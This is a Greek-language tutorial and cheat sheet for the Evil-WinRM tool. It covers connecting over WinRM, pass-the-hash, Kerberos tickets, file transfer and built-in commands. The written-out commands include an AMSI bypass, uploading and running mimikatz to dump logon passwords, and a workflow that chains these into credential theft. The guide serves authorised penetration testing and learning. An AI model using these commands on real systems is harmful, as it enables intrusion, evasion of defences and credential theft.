# 😈 Evil-WinRM — Απομακρυσμένη πρόσβαση σε Windows

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 Περιβάλλον απομακρυσμένων εντολών WinRM
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

---

## Πριν ξεκινήσετε

Το **Evil-WinRM** είναι client απομακρυσμένων εντολών για **Windows Remote Management (WinRM)**. Η επιτυχής σύνδεση απαιτεί διαθέσιμη υπηρεσία, συμβατή αυθεντικοποίηση και δικαιώματα του λογαριασμού. Η χρήση του εργαλείου δεν σας κάνει αυτόματα διαχειριστή ή SYSTEM.

**Βασικοί όροι:** *shell* = περιβάλλον εντολών, *session* = συνεδρία, *upload/download* = αποστολή προς τον απομακρυσμένο υπολογιστή και λήψη από αυτόν, *NT hash* = σύνοψη κωδικού για συγκεκριμένες μορφές αυθεντικοποίησης, *realm* = περιοχή Kerberos, *ccache* = αρχείο προσωρινής αποθήκευσης εισιτηρίων. Το τοπικό αρχείο και η απομακρυσμένη διαδρομή είναι διαφορετικές θέσεις.

Τα σύμβολα προτροπής στην αρχή των παραδειγμάτων δείχνουν πού εκτελείται μια εντολή και δεν αντιγράφονται ως μέρος της. Ο οδηγός διατηρεί το πρωτότυπο, με σημειώσεις για μη υποστηριζόμενες επιλογές και τύπους εκτελέσιμων. Δεν εκτελείται καμία εντολή εδώ.

## 📋 Περιεχόμενα

- [Τι είναι το Evil-WinRM](#section-01)
- [Εγκατάσταση](#section-02)
- [Βασική σύνδεση](#section-03)
- [Εργασίες σε αρχεία](#section-04)
- [Ενσωματωμένες εντολές](#section-05)
- [Pass-the-Hash](#section-06)
- [Αυθεντικοποίηση Kerberos](#section-07)
- [Γρήγορη αναφορά](#section-08)
- [Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Evil-WinRM

**Το Evil-WinRM** είναι εργαλείο απομακρυσμένης διαχείρισης Windows μέσω WinRM, με λειτουργίες χρήσιμες σε εγκεκριμένους ελέγχους:

- 🖥️ **Διαδραστική συνεδρία** — απομακρυσμένες εντολές PowerShell με τα δικαιώματα του λογαριασμού
- 📁 **Μεταφορά αρχείων** — αποστολή προς τον απομακρυσμένο υπολογιστή και λήψη από αυτόν
- 🔓 **Pass-the-Hash** — αυθεντικοποίηση με κατάλληλο NT hash
- 🎫 **Kerberos** — αυθεντικοποίηση μέσω εισιτηρίων
- 🧩 **Μονάδες λειτουργιών** — φόρτωση scripts PowerShell

### Θύρες WinRM

| Θύρα | Protocol — πρωτόκολλο | Σημειώσεις |
| ------ | ---------- | ------- |
| 5985 | HTTP | Προεπιλογή του πρωτοτύπου |
| 5986 | HTTPS | Κρυπτογραφημένη μεταφορά |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

### Kali Linux

```bash
# Παράδειγμα εγκατάστασης
sudo apt update
sudo apt install evil-winrm

# Εναλλακτικά μέσω gem
sudo gem install evil-winrm
```

### Εγκατάσταση από το GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="section-03"></a>

## 💻 Βασική σύνδεση

### Αυθεντικοποίηση με κωδικό

> **Έκδοση επιλογών:** Το -d του πρωτοτύπου δεν περιλαμβάνεται στη δημοσιευμένη επίσημη βοήθεια. Τα παραδείγματα που το χρησιμοποιούν χρειάζονται έλεγχο και προσαρμογή. Δείτε τις [επίσημες επιλογές Evil-WinRM](https://github.com/Hackplayers/evil-winrm#help).


```bash
# Βασική σύνδεση
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Παράδειγμα ορισμού domain· το -d δεν εμφανίζεται στην επίσημη βοήθεια Evil-WinRM
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS στην ενδεικτική θύρα 5986
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Επιλογή θύρας
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### Επιλογές TLS/SSL

> **Σημασία του -S:** Ενεργοποιεί TLS/SSL· δεν αποτελεί από μόνο του ξεχωριστή επιλογή απενεργοποίησης ελέγχου πιστοποιητικού. Επίσης η αλλαγή θύρας με -P δεν ταυτίζεται με ενεργοποίηση TLS.


```bash
# Σύνδεση TLS/SSL· η επιλογή -S αφορά ενεργοποίηση TLS
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Με πιστοποιητικό
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="section-04"></a>

## 📁 Εργασίες σε αρχεία

### Μεταφόρτωση αρχείων στον απομακρυσμένο υπολογιστή

```bash
# Μέσα στη συνεδρία Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Μεταφόρτωση σε συγκεκριμένη απομακρυσμένη θέση
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Ορισμός τοπικού φακέλου εκτελέσιμων μέσω -e, όχι αυτόματη μεταφόρτωση
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Λήψη αρχείων

```bash
# Λήψη αρχείου
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Λήψη σε συγκεκριμένη τοπική θέση
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Τοπικός φάκελος εκτελέσιμων

> **Φάκελος και μεταφόρτωση:** Το -e ορίζει τοπική θέση εκτελέσιμων για σχετικές λειτουργίες· δεν μεταφέρει αυτόματα κάθε αρχείο. Οι λειτουργίες Invoke-Binary αφορούν υποστηριζόμενα .NET assemblies, όχι κάθε native .exe. Τα παραδείγματα Mimikatz του πρωτοτύπου δεν πρέπει να θεωρούνται γενικά έτοιμα για φόρτωση με Invoke-Binary. Δείτε την [τεκμηρίωση του έργου](https://github.com/Hackplayers/evil-winrm).


```bash
# Ορισμός φακέλου εκτελέσιμων· δεν αντικαθιστά την εντολή upload
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Παράδειγμα μεταφόρτωσης αρχείου· το -e αφορά κυρίως λειτουργίες εκτέλεσης
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="section-05"></a>

## 🛠️ Ενσωματωμένες εντολές

### Μενού εντολών

```bash
# Εμφάνιση διαθέσιμων εντολών
*Evil-WinRM* PS C:\> menu

# Ενδεικτική έξοδος διαθέσιμων εντολών:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

### Παραδείγματα τροποποίησης ελέγχων AMSI του πρωτοτύπου

> **Περιορισμένο συμπέρασμα:** Η λειτουργία αφορά AMSI και εξαρτάται από περιβάλλον και έκδοση. Δεν εγγυάται ότι κάθε επόμενο εργαλείο θα εκτελεστεί ή ότι θα παρακάμψει AV/EDR. Το εμφανιζόμενο μενού είναι ενδεικτική έξοδος του πρωτοτύπου.


```bash
# Παράδειγμα δοκιμής παράκαμψης AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Η επιτυχία ή η αποτυχία αυτής της δοκιμής δεν καθορίζει συνολικά την ανίχνευση AV/EDR
```

### Φόρτωση scripts

```bash
# Σύνδεση με ορισμένο τοπικό φάκελο scripts
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Φόρτωση script μέσα στη συνεδρία
*Evil-WinRM* PS C:\> PowerView.ps1

# Χρήση συναρτήσεων του script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Εκτέλεση εκτελέσιμων αρχείων

```bash
# Ορισμός τοπικού φακέλου υποστηριζόμενων εκτελέσιμων
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Εκτέλεση υποστηριζόμενου εκτελέσιμου στη μνήμη
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Με ορίσματα
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Φόρτωση βιβλιοθηκών DLL

```bash
# Φόρτωση DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Υπηρεσίες

```bash
# Προβολή: υπηρεσίες
*Evil-WinRM* PS C:\> services
```

---

<a id="section-06"></a>

## 🔓 Pass-the-Hash

### Σύνοψη NT hash

> **Μορφή δεδομένων:** Η επίσημη βοήθεια ορίζει NT hash για το -H. Το πρώτο παράδειγμα με σύνθετο LM:NT χρειάζεται έλεγχο συμβατότητας. Καταγραφή NetNTLM challenge/response από Responder δεν είναι το ίδιο δεδομένο.


```bash
# Σύνδεση με NT hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Μόνο το NT hash, όπως ζητά το -H
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Παράδειγμα domain· ελέγξτε τη συμβατότητα της επιλογής
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="section-07"></a>

## 🎫 Αυθεντικοποίηση Kerberos

> **Προϋποθέσεις Kerberos:** Realm, KDC, όνομα υπηρεσίας, διαθέσιμο εισιτήριο και χρόνος πρέπει να συμφωνούν με το περιβάλλον. Η παρουσία ενός αρχείου cache δεν αρκεί από μόνη της για έγκυρη σύνδεση.


### Προετοιμασία περιβάλλοντος

```bash
# Ορισμός του KRB5CCNAME στη θέση της cache εισιτηρίων
export KRB5CCNAME=/path/to/ticket.ccache

# Ρυθμίστε το realm στο /etc/krb5.conf
```

### Σύνδεση με Kerberos

```bash
# Αυθεντικοποίηση Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# Με συγκεκριμένη cache εισιτηρίων
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

### Επιλογές σύνδεσης

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `-i` | IP ή όνομα υπολογιστή προορισμού |
| `-u` | Όνομα χρήστη |
| `-p` | Κωδικοί πρόσβασης |
| `-H` | NT hash κωδικού, όχι καταγραφή NetNTLM challenge/response |
| `-d` | Περιγραφή πρωτοτύπου· δεν εμφανίζεται στην επίσημη βασική βοήθεια Evil-WinRM |
| `-S` | Χρήση TLS/SSL για HTTPS |
| `-P` | Θύρα |
| `-r` | Realm — περιοχή αυθεντικοποίησης Kerberos |

### Επιλογές αρχείων

| Επιλογή | Περιγραφή |
| -------- | ------------- |
| `-s` | Τοπικός φάκελος scripts |
| `-e` | Τοπικός φάκελος εκτελέσιμων |
| `-c` | Πιστοποιητικό TLS/SSL |
| `-k` | Ιδιωτικό κλειδί TLS/SSL |

### Εντολές συνεδρίας

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `upload` | Αποστολή αρχείου |
| `download` | Λήψη αρχείου |
| `menu` | Εμφάνιση εντολών |
| `Bypass-4MSI` | Δοκιμή παράκαμψης AMSI |
| `Invoke-Binary` | Εκτέλεση υποστηριζόμενου εκτελέσιμου στη μνήμη |
| `services` | Καταγραφή υπηρεσιών |
| `Dll-Loader` | Φόρτωση DLL |

### Συνήθης ακολουθία εργασίας

```bash
# 1. Σύνδεση
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Παράδειγμα δοκιμής παράκαμψης AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Μεταφόρτωση εργαλείων του παραδείγματος
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Εκτέλεση
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Λήψη αρχείου αποτελεσμάτων
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [Πηγαίος κώδικας Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Τεκμηρίωση Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Σχετικοί οδηγοί
- [CrackMapExec](../../CrackMapExec/translations/README.el.md)
- [Impacket](../../Impacket/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

<p align="center">
  <b>😈 Εξασκηθείτε στην απομακρυσμένη διαχείριση Windows!</b><br>
  <i>Evil-WinRM — συνεδρίες διαχείρισης μέσω WinRM</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
